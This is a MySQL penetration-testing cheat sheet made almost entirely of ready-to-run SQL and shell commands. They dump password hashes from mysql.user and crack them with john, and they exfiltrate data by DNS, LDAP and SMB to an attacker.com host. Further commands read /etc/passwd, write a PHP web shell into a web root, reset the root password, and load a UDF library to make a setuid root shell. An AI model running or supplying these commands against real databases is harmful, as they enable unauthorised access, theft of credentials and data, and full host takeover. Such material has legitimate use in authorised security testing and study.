### Version & Vars

```SQL
select @@version_compile_os, @@version_compile_machine, @@version , @@tmpdir , @@plugin_dir  ;
show variables;
```

### Priv
```SQL

select grantee, table_schema, privilege_type FROM INFORMATION_SCHEMA.SCHEMA_PRIVILEGES;
```

### Enum users Passwords

```SQL
select user,password from mysql.user;
```


### Blind SQL Data Exfiltration.


**Detect

```sql
SLEEP(5)
```

**Exfiltrate


```SQL
-- DNS Request

SELECT LOAD_FILE(CONCAT('\\\\', (SELECT foo FROM bar), '.attacker.com'));

--HTTP
SELECT DBMS_LDAP.INIT((SELECT foo FROM bar)||'.attacker.com',80) FROM DUAL;

-- SMB Share

SELECT * FROM USERS INTO OUTFILE '\\attacker\SMBshare\output.txt'
```



### Brute Force

**Old algo**

```Shell
john --format=MYSQL password.txt
```


**SHA1(UNHEX(SHA1('PASS')))**

```Shell
john --format=MYSQL-sha1 password.txt
```

### Show users with File Priv

```SQL
select user,File_priv from mysql.user;
```

```SQL
SHOW variable like "%local%" ;
SHOW variable like "%secure_file%" ;
```

### Read And Write Into FIle

```SQL
Select load_file('/etc/passwd');
LOAD DATA INFILE '/etc/passwd' INTO TABLE "mytable";
```

```SQL
SELECT "<?php echo shell_exec($_GET['c']);?>" into OUTFILE 'C:/xampp/htdocs/back.php'
```

### Exploitation

**Get a shell with the mysql client user

```SQL
grant SELECT,CREATE,DROP,UPDATE,DELETE,INSERT on *.* to mysql identified by 'mysql' WITH GRANT OPTION;
\! sh
```

**Try to change MySQL root password

```SQL
UPDATE mysql.user SET Password=PASSWORD('MyNewPass') WHERE User='root';
UPDATE mysql.user SET authentication_string=PASSWORD('MyNewPass') WHERE User='root';
FLUSH PRIVILEGES;
quit;
```

** Privilege Escalation via library UDF**

```shell
git clone https://github.com/mysqludf/lib_mysqludf_sys.git
cd lib_mysqludf_sys/
apt remove libmariadb-dev
wget http://ftp.debian.org/debian/pool/main/m/mariadb-10.3/libmariadb-dev_10.3.34-0+deb10u1_amd64.deb
sudo dpkg -i ./libmariadb-dev_10.3.34-0+deb10u1_amd64.deb
xxd -p lib_mysqludf_sys.so | tr -d '\n' > lib_mysqludf_sys.so.hex
```


```SQL

set @shell = 
0x7f454c4602010100000000000000000003003e000100000000110000000000004000000000000000e03b0000000000000000000040003800090040001c001b000100000004000000000000...00000000000000000000;
select @@plugin_dir;
select binary @shell into dumpfile '/home/dev/plugin/agh_sys_exec.so';
create function sys_exec returns int soname 'agh_sys_exec.so';
select * from mysql.func where name='sys_exec'
select sys_exec('cp /bin/sh /tmp/; chown root:root /tmp/sh; chmod +s /tmp/sh')
```